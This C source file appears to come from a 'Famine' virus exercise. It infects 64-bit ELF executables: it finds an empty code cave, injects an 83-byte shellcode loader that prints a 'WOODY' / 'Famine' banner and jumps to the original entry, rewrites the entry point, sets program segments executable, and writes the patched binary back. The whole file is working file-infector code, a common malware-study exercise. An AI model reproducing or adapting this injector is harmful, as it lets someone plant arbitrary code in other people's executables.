#include <famine.h>

#define _BUFFER_SIZE 83

uint8_t loader[_BUFFER_SIZE] = {
  0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x35, 0x0c, 0x00, 0x00, 0x00, 0xba, 0x0e, 0x00,
  0x00, 0x00, 0x0f, 0x05, 0xe9, 0x4c, 0x10, 0x00, 0x00, 0x2e,
  0x2e, 0x2e, 0x2e, 0x57, 0x4f, 0x4f, 0x44, 0x59, 0x2e, 0x2e,
  0x2e, 0x2e, 0x0a, 0x46, 0x61, 0x6d, 0x69, 0x6e, 0x65, 0x20,
  0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x39, 0x39,
  0x2e, 0x30, 0x20, 0x28, 0x63, 0x29, 0x6f, 0x64, 0x65, 0x64,
  0x20, 0x62, 0x79, 0x20, 0x3c, 0x61, 0x72, 0x61, 0x6f, 0x75,
  0x74, 0x3e, 0x0a
};

unsigned int 		jmp_offset = 25;

bool		get_cave(t_famine *famine)
{
	off_t	i;
	char	*ptr;
	char	*ptr_zero;
	t_code_cave cave;
	uint32_t		zero_size;
	uint32_t		zero_offset;
	uint32_t		biggest_zero_size;
	uint32_t		biggest_zero_offset;

	i = 0;
	ptr = famine->ptr;
	biggest_zero_size = 0;
	biggest_zero_offset = 0;
	zero_size = 0;
	while (i < famine->size)
	{
		while (i < famine->size && ptr[i] == 0x00)
		{
			if (zero_size == 0)
			{
				ptr_zero = ptr+i;
				zero_offset = i;
			}
			zero_size++;
			i++;
		}
		if (zero_size > biggest_zero_size)
		{
			biggest_zero_size = zero_size;
			biggest_zero_offset = zero_offset;
			cave.ptr = ptr_zero;
		}
		zero_size = 0;
		i++;
	}
	cave.size = biggest_zero_size;
	cave.offset = biggest_zero_offset;
	famine->cave = cave;
	return (true);
}

void		inject_loader(t_famine *famine, int old_entry)
{
	uint32_t	jmp_value;

	jmp_value = old_entry - (((t_code_cave)famine->cave).offset + jmp_offset)+1;
	memmove((char*)loader+jmp_offset, &jmp_value, sizeof(uint32_t));
	memmove(((t_code_cave)famine->cave).ptr, loader, _BUFFER_SIZE);
}


void		write_to_file(t_famine *famine)
{
	int	fd = famine->fd;
	//int	fd = open("KDA", O_RDWR | O_CREAT | O_TRUNC, (mode_t)0755);
	int	size = famine->size;
	write(fd, famine->ptr, size);
}

void		make_entry_exec(t_famine *famine)
{
	Elf64_Ehdr *hdr;
	Elf64_Phdr *phdr;
	int			i = 0;

	hdr = famine->ptr;
	phdr = famine->ptr + hdr->e_phoff;
	while (i < hdr->e_phnum - 1)
	{
		if ((phdr[i].p_offset < hdr->e_entry) 
			&& (phdr[i].p_offset + phdr[i].p_filesz) < hdr->e_entry)
			phdr[i].p_flags |= PF_X;
		i++;
	}
}

void		handle_elf64(t_famine *famine)
{
	Elf64_Ehdr *header;
	
	header = (Elf64_Ehdr*)famine->ptr;
	get_cave(famine);
	if ((((t_code_cave)famine->cave).size) > _BUFFER_SIZE)
	{
		famine->method = famine->method & CODE_CAVE_METHOD;
		inject_loader(famine, header->e_entry);
		header->e_entry = ((t_code_cave)famine->cave).offset;
	}
	make_entry_exec(famine);
	printf("\t%s\nSIZE = %ld\t",famine->filename,  famine->size);
	printf("E_ENTRY NEW = %lx\n", header->e_entry);
	for (int i  = header->e_entry ; i < (int)header->e_entry+_BUFFER_SIZE; i++)
	{
		printf("%x  ", ((uint8_t*)famine->ptr)[i]);
	}
	write_to_file(famine);
}